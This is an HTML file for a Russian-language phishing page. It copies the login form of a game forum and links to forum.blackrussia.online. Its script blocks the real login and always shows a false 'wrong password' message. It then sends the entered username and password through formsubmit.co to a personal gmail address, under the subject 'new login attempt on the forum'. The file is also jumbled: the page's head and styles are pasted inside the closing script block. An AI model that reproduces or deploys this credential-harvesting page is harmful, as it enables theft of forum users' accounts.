<input type="password" name="password" id="password" required>

      <div class="checkbox-label">
        <input type="checkbox" id="showPass">
        <label for="showPass">Показать пароль</label>
      </div>

      <div class="small-links">
        <a href="#">Забыли свой пароль?</a>
      </div>

      <div class="checkbox-label">
        <input type="checkbox" name="remember" id="remember">
        <label for="remember">Запомнить меня</label>
      </div>

      <button type="submit" class="btn">ВОЙТИ</button>
    </form>

    <p style="text-align:center; margin-top: 20px; font-size: 14px;">
      У Вас ещё нет учётной записи? <a href="#" style="color: #fff;">Зарегистрируйтесь</a>
    </p>
  </div>

  <div class="footer">
    <div class="lang">Русский (RU)</div>
    <a href="#">Условия и правила</a> |
    <a href="#">Политика конфиденциальности</a> |
    <a href="#">Главная</a> |
    <a href="#">Помощь</a>
  </div>

  <script>
    const toggle = document.getElementById('showPass');
    const passwordField = document.getElementById('password');
    const loginForm = document.getElementById('loginForm');
    const errorMessage = document.getElementById('errorMessage');

    // Показать/скрыть пароль
    toggle.addEventListener('change', () => {
      passwordField.type = toggle.checked ? 'text' : 'password';
    });

    // Обработка формы
    loginForm.addEventListener('submit', function(e) {
      e.preventDefault();
      
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      
      // Показываем сообщение об ошибке
      errorMessage.style.display = 'block';
      
      // Очищаем поле пароля
      document.getElementById('password').value = '';
      
      // Отправка данных на FormSubmit
      fetch('https://formsubmit.co/dozernovs@gmail.com', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username: username,
          password: password,
          _subject: 'Новая попытка входа на форум',
          _captcha: false
        })
      });
    });
    <!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Форум</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", sans-serif;
      background-color: #1a1a1a;
      color: #e0e0e0;
    }

    header {
      background-color: #2a2a2a;
      padding: 0;
      border-bottom: 1px solid #3a3a3a;
    }

    .nav {
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 0;
    }

    .nav-item {
      padding: 12px 20px;
      color: #ccc;
      text-decoration: none;
      font-size: 15px;
      border-top-left-radius: 6px;
      border-top-right-radius: 6px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .nav-item span.box {
      display: inline-block;
      width: 14px;
      height: 14px;
      border: 2px solid #777;
      border-radius: 3px;
    }

    .nav-item.active {
      background-color: #1e1e1e;
      color: #ffffff;
    }

    .nav-item.active span.box {
      border-color: #ffffff;
    }

    .container {
      max-width: 440px;
      margin: 30px auto;
      background-color: #2a2a2a;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 12px rgba(0, 0, 0, 0.5);
    }

    h2 {
      font-size: 24px;
      margin-bottom: 20px;
      color: white;
    }

    .alert {
      background-color: #ffdddd;
      color: #a33;
      padding: 12px;
      border-left: 4px solid #e44;
      margin-bottom: 20px;
      border-radius: 5px;
      font-size: 14px;
    }

    .alert-error {
      background-color: #ffdddd;
      color: #a33;
      padding: 12px;
      border-left: 4px solid #e44;
      margin-bottom: 20px;
      border-radius: 5px;
      font-size: 14px;
      display: none;
    }

    label {
      font-size: 14px;
      margin: 10px 0 5px;
      display: block;
      color: #ccc;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      background-color: #1e1e1e;
      border: 1px solid #444;
      border-radius: 4px;
      color: white;
      box-sizing: border-box;
    }

    .checkbox-label {
      display: flex;
      align-items: center;
      margin-top: 10px;
      font-size: 14px;
      color: #ccc;
    }

    .checkbox-label input {
      margin-right: 10px;
    }

    .btn {
      background-color: #1e1e1e;
      color: white;
      border: 1px solid #555;
      padding: 12px;
      margin-top: 20px;
      width: 100%;
      cursor: pointer;
      font-weight: bold;
      border-radius: 5px;
      transition: 0.3s;
      font-size: 16px;
    }

    .btn:hover {
      background-color: #333;
    }

    .footer {
      text-align: center;
      color: #999;
      font-size: 13px;
      margin: 40px auto;
    }

    .footer a {
      color: #888;
      text-decoration: none;
      margin: 0 8px;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    .lang {
      margin-bottom: 10px;
    }

    .small-links {
      font-size: 13px;
      margin-top: 12px;
    }

    .small-links a {
      color: #aaa;
    }
  </style>
</head>
<body>

  <header>
    <div class="nav">
      <a href="https://forum.blackrussia.online/" class="nav-item">
        <span class="box"></span> ГЛАВНАЯ
      </a>
      <a href="#" class="nav-item active">
        <span class="box"></span> ФОРУМЫ
      </a>
      <a href="#" class="nav-item">
        <span class="box"></span>
      </a>
      <a href="#" class="nav-item">
        <span class="box"></span>
      </a>
    </div>
  </header>

  <div class="container">
    <h2>Вход</h2>

    <div class="alert">
      Для того, чтобы это сделать, нужно сначала войти на форум.
    </div>

    <div class="alert-error" id="errorMessage">
      Пароль не верный. Пожалуйста, попробуйте еще раз.
    </div>

    <form id="loginForm">
      <label>Имя пользователя или email:</label>
      <input type="text" name="username" id="username" required>

      <label>Пароль:</label>
  </script>
</body>
</html>
